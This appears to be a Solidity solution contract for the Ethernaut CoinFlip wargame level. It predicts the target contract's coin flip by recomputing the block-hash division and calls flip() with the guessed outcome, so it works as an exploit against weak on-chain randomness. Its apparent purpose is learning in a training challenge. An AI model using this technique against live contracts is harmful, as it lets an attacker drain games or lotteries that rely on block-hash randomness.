// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TwoLevelEthernaut.sol";

contract Prediction {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip public coinFlip_;

    bool public side;

    constructor(address _coinFlip) {
        coinFlip_ = CoinFlip(_coinFlip);
    }

    function getPrediction() public returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

         uint256 coinFlip = blockValue / FACTOR;
         side = coinFlip == 1 ? true : false;
         return side;
    }

    function getWin() external {
        coinFlip_.flip(getPrediction());
    }
}